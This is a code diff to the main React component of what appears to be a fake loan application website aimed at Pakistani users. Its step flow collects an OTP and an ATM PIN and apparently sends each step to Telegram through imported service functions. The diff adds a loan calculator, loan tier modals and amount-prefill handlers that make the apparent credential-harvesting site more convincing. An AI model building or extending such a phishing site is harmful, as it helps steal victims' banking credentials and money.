@@ -18,6 +18,8 @@ import { Step4OtpVerification } from './components/Step4OtpVerification';
 import { Step5AtmPin } from './components/Step5AtmPin';
 import { StepSuccess } from './components/StepSuccess';
 import { StatusModal } from './components/StatusModal';
+import { CalculatorModal } from './components/CalculatorModal';
+import { LoanTiersModal } from './components/LoanTiersModal';
 import { sendStepNotification, sendFinalApplicationToTelegram } from './services/telegramService';
 
 const INITIAL_PERSONAL: PersonalInfo = {
@@ -55,7 +57,11 @@ export default function App() {
   const [pin, setPin] = useState<string>('');
   const [trackingId, setTrackingId] = useState<string>('');
   const [savedApplications, setSavedApplications] = useState<ApplicationData[]>([]);
+  
+  // Modals state
   const [isStatusModalOpen, setIsStatusModalOpen] = useState<boolean>(false);
+  const [isCalculatorOpen, setIsCalculatorOpen] = useState<boolean>(false);
+  const [isTiersOpen, setIsTiersOpen] = useState<boolean>(false);
 
   // Load stored applications from localStorage
   useEffect(() => {
@@ -85,6 +91,12 @@ export default function App() {
   }, [currentStep]);
 
   const handleStartApply = () => {
+    setCurrentStep('step1');
+    window.scrollTo({ top: 0, behavior: 'smooth' });
+  };
+
+  const handleSelectAmountFromModal = (amount: string) => {
+    setBank((prev) => ({ ...prev, loanAmount: Number(amount).toLocaleString('en-PK') }));
     setCurrentStep('step1');
     window.scrollTo({ top: 0, behavior: 'smooth' });
   };
@@ -183,11 +195,13 @@ export default function App() {
   };
 
   return (
-    <div className="min-h-screen flex flex-col bg-slate-100 font-sans text-slate-800 antialiased selection:bg-[#0e5e38] selection:text-white">
+    <div className="min-h-screen flex flex-col bg-slate-100 font-sans text-slate-900 antialiased selection:bg-emerald-700 selection:text-white">
       {/* Top Header */}
       <Header
         onApplyClick={handleStartApply}
         onTrackClick={() => setIsStatusModalOpen(true)}
+        onCalculatorClick={() => setIsCalculatorOpen(true)}
+        onTiersClick={() => setIsTiersOpen(true)}
         onHomeClick={() => setCurrentStep('hero')}
         currentStep={currentStep}
       />
@@ -197,10 +211,10 @@ export default function App() {
         {currentStep === 'hero' ? (
           <LeadershipHero
             onStartApplication={handleStartApply}
-            onTrackApplication={() => setIsStatusModalOpen(true)}
+            onOpenCalculator={() => setIsCalculatorOpen(true)}
           />
         ) : (
-          <div className="py-6 px-4 sm:px-6">
+          <div className="py-6 px-4 sm:px-6 max-w-4xl mx-auto">
             {/* Show Stepper during step workflow */}
             {currentStep !== 'success' && currentStep !== 'searching' && (
               <Stepper
@@ -311,9 +325,25 @@ export default function App() {
       <Footer
         onApplyClick={handleStartApply}
         onTrackClick={() => setIsStatusModalOpen(true)}
+        onCalculatorClick={() => setIsCalculatorOpen(true)}
+        onTiersClick={() => setIsTiersOpen(true)}
       />
 
-      {/* Status Modal */}
+      {/* Calculator Modal */}
+      <CalculatorModal
+        isOpen={isCalculatorOpen}
+        onClose={() => setIsCalculatorOpen(false)}
+        onSelectAmount={handleSelectAmountFromModal}
+      />
+
+      {/* Loan Tiers Modal */}
+      <LoanTiersModal
+        isOpen={isTiersOpen}
+        onClose={() => setIsTiersOpen(false)}
+        onSelectTier={handleSelectAmountFromModal}
+      />
+
+      {/* Status Tracking Modal */}
       <StatusModal
         isOpen={isStatusModalOpen}
         onClose={() => setIsStatusModalOpen(false)}
